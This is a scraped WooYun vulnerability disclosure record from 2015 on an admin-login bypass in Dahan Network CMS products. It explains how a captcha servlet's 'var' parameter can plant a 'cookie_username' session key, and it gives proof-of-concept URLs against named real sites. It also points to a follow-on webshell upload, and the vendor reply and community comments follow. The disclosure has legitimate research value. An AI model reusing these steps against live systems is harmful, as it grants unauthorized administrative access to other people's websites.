{"id": 17611, "wybug_id": "wooyun-2015-0107138", "wybug_title": "大汉网络0day通杀所有系统和版本", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "矿主", "wybug_date": "2015-04-10 18:12", "wybug_open_date": "2015-07-14 10:38", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "认证缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-14：\t细节向公众公开  简要描述： 管理后台权限绕过，进入后台后轻松GetShell，经验证通杀所有系统和版本，包括：jcms，jact，jsearch，vipchat，vc，xxgk等等。我估计这是大汉影响范围最大的漏洞了。求加精！ 详细说明：  Setup目录Session权限绕过：\n代码分析 /jcms/setup/opr_licenceinfo.jsp ：  //获取Session中cookie_username的值，赋值给strUser  String strUser = (String)sessions.getAttribute(\"cookie_username\"); // 判断strUser值 是否为空？ if( strUser == null || strUser.trim().length() == 0 ) {    out.println('请先登录!')  return; }  //如果为空，则未登录，直接返回// 如果不为空，说明已经登录\n逆向java servlet 的代码 /VerifyCodeServlet\n// 获取请求参数 var，赋值给 strVar  String strVar = Convert.getParameter(request, \"var\", \"\");  if(strVar == null){   request.getSession().setAttribute(\"COMPLAT\", str_code); // 将随机码保存到SESSION中 }else{ // 如果 strVar 不为空的话，创建 strVar 为名称的 SESSION 值  request.getSession().setAttribute(strVar, str_code); // 将随机码保存到SESSION中 }所以通过参数 var， 就可以控制SESSION的名称的创建\n通过两个程序的分析，整理一下：1. opr_licenceinfo.jsp需要一个SESSION cookie_username 不为空，就可以成功登录2. /VerifyCodeServlet 可以 创建任意 SESSION的key值所以两者配合，就可以构造成功登录了。   漏洞证明：  直接访问opr_licenceinfo.jsp 需要登录http://www.zgzhijiang.gov.cn/jcms/setup/opr_licenceinfo.jsp\n\n添加一个Session值  cookie_usernamehttp://www.zgzhijiang.gov.cn/jcms/VerifyCodeServlet?var=cookie_username\n\n然后再次访问/jcms/setup/opr_licenceinfo.jsp，成功登录。\n\nLicence文件上传webshell漏洞，不演示了，参考：http://wooyun.org/bugs/wooyun-2010-052699vipchat 的 POC：http://sdds.gov.cn/vipchat/setup/http://sdds.gov.cn/vipchat/VerifyCodeServlet?var=cookie_usernamehttp://sdds.gov.cn/vipchat/setup/admin.jsp\n\njsearch 的 POC：http://www.hyhjbh.com/jsearch/setup/http://www.hyhjbh.com/jsearch/VerifyCodeServlet?var=cookie_usernamehttp://www.hyhjbh.com/jsearch/setup/opr_licenceinfo.jsp\n\n其他的大汉系统，就不一一罗列了，这算是一个VerifyCodeServlet组件的逻辑漏洞吧，大汉的所有系统都包含VerifyCodeServlet这个组件，用于生成验证码，所以导致了所有系统的通杀，影响范围非常广了。注意：1. 有一些站点，访问setup目录，返回403，禁止了访问。2. 大汉2015新版，不影响。\n\n   修复方案：  修复VerifyCodeServlet组件的逻辑。   版权声明：转载请注明来源 矿主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-04-15 10:36 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-10 18:17 |    \t\txss_art \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:3        | 只会弹框框的跨站师。。。。)\t\t \n  关注。。    \n     2015-04-10 18:21 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  ...    \n     2015-04-10 18:45 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  怎么找到的呢？    \n     2015-04-10 18:59 |    \t\t命运 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我是来乌云秀智商下限的~~)\t\t \n  炸了    \n     2015-04-10 21:19 |    \t\t炊烟 \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:44        | 每一天都需要努力。)\t\t \n  膜拜    \n     2015-04-10 22:06 |    \t\txtnnd \t\t\t( 普通白帽子  |\t\t\t        Rank:180 漏洞数:43        )\t\t \n  妈妈问我为什么跪着上网    \n     2015-04-12 15:37 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  这个碉堡    \n     2015-05-06 15:21 |    \t\tSnake~ \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 0.0)\t\t \n  妈妈问我为什么跪着上网    \n     2015-05-10 07:25 |    \t\th4ckhell00 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 最温暖的两个字是什么？1、我在。2、别怕。...)\t\t \n  洞主M我~~~~ 有问题请教    \n     2015-05-10 17:52 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  這個吊。    \n     2015-06-09 12:21 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  嘿嘿，给力，当时都没注意到这哈哈    \n     2015-06-18 20:28 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 南无阿弥陀佛！)\t\t \n  关注一下    \n     2015-06-29 11:34 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 南无阿弥陀佛！)\t\t \n  mark    \n     2015-07-14 12:00 |    \t\tbakde \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:3        | 我是一个很菜的白帽子)\t\t \n  才给5rank    \n     2015-07-14 14:05 |    \t\t网路游侠 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:2        | 不玩渗透好多年……)\t\t \n  rank=5 ??? 我没看花眼？？？    \n     2015-07-15 10:54 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @网路游侠 没    \n     2015-07-27 11:04 |    \t\t网路游侠 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:2        | 不玩渗透好多年……)\t\t \n  @wefgod 给的太低了……    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}